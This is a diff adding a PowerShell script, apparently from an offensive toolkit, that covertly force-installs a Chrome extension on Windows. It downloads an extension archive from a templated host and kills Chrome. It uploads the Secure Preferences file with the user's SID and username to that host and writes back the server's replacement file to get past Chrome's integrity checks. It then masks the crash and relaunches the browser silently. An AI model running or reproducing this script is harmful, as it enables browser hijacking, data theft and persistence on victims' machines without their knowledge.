@@ -1,0 +1,39 @@
+$hostname = "#HOSTNAME#"
+$extension = "#EXTENSION_NAME#"
+$extension_path = "$env:USERPROFILE\#EXTENSION_PATH#"
+$os = "windows"
+
+$chrome = "chrome.exe"
+$chromePath = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
+
+# Check if Chrome is installed
+if (Test-Path $chromePath) {
+
+    # Change to extension directory
+    Set-Location -Path $extension_path
+
+    # Download Extension
+    $zipFile = "$extension.zip"
+    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
+    (New-Object Net.WebClient).DownloadFile("https://$hostname/download/extension/$zipFile", "$extension_path\$zipFile")
+    Expand-Archive -Path $zipFile -DestinationPath $extension_path -Force
+    Remove-Item -Path $zipFile -Force
+
+    # Kill Google Chrome
+    Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 1
+
+    # Update Secure Preferences File
+    Set-Location -Path $env:USERPROFILE
+    $sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -replace '-\d+$', ''
+    $spf = "$extension_path\Secure Preferences"
+    $ResponseBytes = (New-Object System.Net.WebClient).UploadFile("https://$hostname/upload/?extension=$extension&os=$os&sid=$sid&user=$env:USERNAME", "POST", "$spf")
+    [System.IO.File]::WriteAllBytes("$spf", $ResponseBytes)
+
+    # Open Google Chrome
+    $pf = "$extension_path\Preferences"
+    (Get-Content -Raw -Path $pf) -replace '"exit_type":\s*"Crashed"', '"exit_type": "Normal"' | Set-Content -Path $pf -Encoding UTF8
+    Start-Sleep -Seconds 1
+    Start-Process -FilePath $chromePath -ArgumentList "--restore-last-session --noerrdialogs"
+
+}
